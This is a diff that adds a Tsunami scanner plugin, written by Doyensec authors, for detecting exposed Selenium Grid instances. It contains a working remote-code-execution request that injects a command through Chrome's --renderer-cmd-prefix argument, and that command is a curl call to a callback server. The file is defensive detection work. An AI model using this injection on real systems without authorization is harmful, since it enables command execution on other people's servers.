@@ -1,0 +1,153 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "SeleniumGrid_ExposedUI"
+  author: 
+    "Robert Dick (robert@doyensec.com) for the Templated version,"
+    " Dawid Golunski (dawid@doyensec.com) for the original Java version"
+  version: "2.0"
+}
+
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "SeleniumGrid_ExposedUI"
+  }
+  severity: CRITICAL
+  title: "Selenium Grid Exposed API"
+  description: 
+    "The scanner detected an exposed Selenium Grid service that allows annonymous access."
+    " It is possible to connect to Selenium Grid to create a remote Chrome webdriver"
+    " with a set of configurations such as --renderer-cmd-prefix which can allow attackers"
+    " to inject an arbitrary command that will get executed when a browser is started."
+  recommendation: 
+    "Restrict access to the exposed Selenium Grid by adding --username and --password parameters"
+    " to selenium-server.jar command line, or within the [router] section in"
+    " the Selenium Grid config file (/opt/selenium/config.toml).\n"
+    "See: https://www.selenium.dev/documentation/grid/configuration/cli_options/#router"
+}
+
+
+###########
+# ACTIONS #
+###########
+
+
+actions: {
+  name: "fingerprint_selenium_grid"
+  http_request: {
+    method: GET
+    uri: "/status"
+    response: {
+      expect_any: {
+        conditions: [
+          { body: {} contains: "Selenium Grid" },
+          { body: {} contains: "selenium grid" },
+          { body: {} contains: "Selenium grid" }
+        ]
+      }
+    }
+  }
+}
+
+# we don't care about the response for this request since 
+# we can check output from either file read or callback server
+
+actions: {
+  name: "execute_payload"
+  http_request: {
+    method: POST
+    uri: "/wd/hub/session"
+    headers: [
+      { name: "User-Agent" value: "TSUNAMI_SCANNER"},
+      { name: "Content-Type" value: "application/json"}
+    ]
+    data: 
+      '{'
+      '  "capabilities": {'
+      '    "firstMatch": ['
+      '      {}'
+      '    ],'
+      '    "alwaysMatch": {'
+      '      "browserName": "chrome",'
+      '      "pageLoadStrategy": "normal",'
+      '      "platformName": "linux",'
+      '      "cloud:options": {'
+      '        "build": "RCE",'
+      '        "name": "RCE"'
+      '      },'
+      '      "goog:chromeOptions": {'
+      '        "extensions": [],'
+      '        "args": ['
+      '          "--no-sandbox",'
+      '          "--renderer-cmd-prefix={{ PAYLOAD }} --"'
+      '        ]'
+      '      }'
+      '    }'
+      '  }'
+      '}'
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: '"sessionId": "([^"]+)"'
+            variable_name: "SESSIONID1"
+          }
+        ]
+      }
+    }
+  }
+  cleanup_actions: ["delete_session"]
+}
+
+actions: {
+  name: "delete_session"
+  http_request: {
+    method: DELETE
+    uri: "/wd/hub/session/{{ SESSIONID1 }}"
+    headers: [
+      { name: "User-Agent" value: "TSUNAMI_SCANNER"}
+    ]
+  }
+}
+
+# OOB sleep and check callback server steps
+# since we already fingerprinted we can do a long sleep here.
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 5000 } }
+}
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+
+#############
+# WORKFLOWS #
+#############
+
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  variables: [
+    { name: "PAYLOAD" value: "curl {{ T_CBS_URI }}" }
+  ]
+  actions: [
+    "fingerprint_selenium_grid",
+    "execute_payload",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
+
